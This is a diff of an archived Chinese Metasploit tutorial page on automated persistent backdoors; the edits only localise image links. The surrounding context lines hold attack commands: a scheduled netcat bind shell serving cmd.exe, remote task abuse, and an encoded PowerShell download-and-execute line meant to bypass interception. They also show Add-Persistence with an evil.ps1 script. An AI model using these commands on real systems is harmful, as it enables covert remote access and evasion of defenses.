@@ -12,7 +12,7 @@
 <h1>玩转Metasploit之Automated Persistent Backdoor</h1>
 
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101217293631.jpg" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101217293631.jpg" onerror="return imgError(this)">
 </p>
 <h1>
  0x00 简介
@@ -43,7 +43,7 @@
  。
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310121981353249.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310121981353249.png" onerror="return imgError(this)">
 </p>
 <p>
  使用举例：
@@ -81,7 +81,7 @@
  。
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310122137294346.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310122137294346.png" onerror="return imgError(this)">
 </p>
 <p>
  使用举例：
@@ -135,7 +135,7 @@
  </strong>
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310122336566436.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310122336566436.png" onerror="return imgError(this)">
 </p>
 <pre><code>run scheduleme -m 1 -e /tmp/nc.exe -o "-e cmd.exe -L -p 8080" #上传nc并创建计划任务每一分钟执行一次 'nc -e cmd.exe -L -p 8080'
 run scheduleme -m 1 -c "cmd /c calc.exe" # 创建计划任务每一分钟执行一次打开计算器命令
@@ -151,7 +151,7 @@ run scheduleme -m 1 -c "cmd /c calc.exe" # 创建计划任务每一分钟执行�
  </strong>
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310122553724522.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310122553724522.png" onerror="return imgError(this)">
 </p>
 <pre><code>run schtasksabuse -t 192.168.2.7 -c "cmd /c calc.exe" -d 4  #每隔4秒执行一次calc.exe
 </code></pre>
@@ -182,7 +182,7 @@ run scheduleme -m 1 -c "cmd /c calc.exe" # 创建计划任务每一分钟执行�
  )
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310122764070618.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310122764070618.png" onerror="return imgError(this)">
 </p>
 <p>
  详细使用过程就不再重复了。
@@ -216,7 +216,7 @@ exploit -j -z
  当生成会话以后，自动执行persistence，结果就像这样：
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310122995078718.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310122995078718.png" onerror="return imgError(this)">
 </p>
 <p>
  当然，同样可以设置metsvc
@@ -244,7 +244,7 @@ exploit -j -z
  ：用来执行msf的命令的脚本，帮助信息如下：
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310123052635818.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310123052635818.png" onerror="return imgError(this)">
 </p>
 <p>
  使用示例：
@@ -252,7 +252,7 @@ exploit -j -z
 <pre><code>meterpreter &gt; run multi_console_command -cl "pwd"
 </code></pre>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/2016062310123361307918.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/2016062310123361307918.png" onerror="return imgError(this)">
 </p>
 <blockquote>
  <p>
@@ -266,7 +266,7 @@ exploit -j -z
  ：用来执行cmd命令的脚本，帮助信息如下：
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101236268101017.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101236268101017.png" onerror="return imgError(this)">
 </p>
 <p>
  使用示例：
@@ -274,7 +274,7 @@ exploit -j -z
 <pre><code>run multicommand -cl "whoami"
 </code></pre>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101237852361121.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101237852361121.png" onerror="return imgError(this)">
 </p>
 <blockquote>
  <p>
@@ -349,7 +349,7 @@ exploit -j
  进行配置并开启监听，当产生一个会话以后，自动执行screenshot以及persistent操作，最后关闭当前会话继续等待。效果如下图:
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101239834301219.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101239834301219.png" onerror="return imgError(this)">
 </p>
 <h1>
  0x04 绕过拦截
@@ -389,7 +389,7 @@ exploit -j
  测试shell下直接执行(被拦截):
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101241937271317.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101241937271317.png" onerror="return imgError(this)">
 </p>
 <p>
  <strong>
@@ -420,7 +420,7 @@ exploit -j
 <pre><code>echo "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1');" | iconv --to-code UTF-16LE |base64
 </code></pre>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101242867201515.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101242867201515.png" onerror="return imgError(this)">
 </p>
 <p>
  最后执行的命令为：
@@ -487,7 +487,7 @@ PS C:\Persistence&gt; Add-Persistence -FilePath .\evil.ps1 -ElevatedPersistenceO
  最终生成脚本如下：
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101244183261713.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101244183261713.png" onerror="return imgError(this)">
 </p>
 <p>
  <strong>
@@ -572,7 +572,7 @@ PS C:\Persistence&gt; Add-Persistence -FilePath .\evil.ps1 -ElevatedPersistenceO
  当获取meterpreter会话以后，自动执行命令安装后门：
 </p>
 <p>
- <img  alt="Alt text" src="http://static.wooyun.org//drops/20160623/20160623101246109031812.png" onerror="return imgError(this)">
+ <img  alt="Alt text" src="../image/drops/20160623/20160623101246109031812.png" onerror="return imgError(this)">
 </p>
 <p>
  这样，两者就完美的结合了。重启以后，空闲状态时，脚本执行，重新获取meterpreter会话。这里就不截图了。
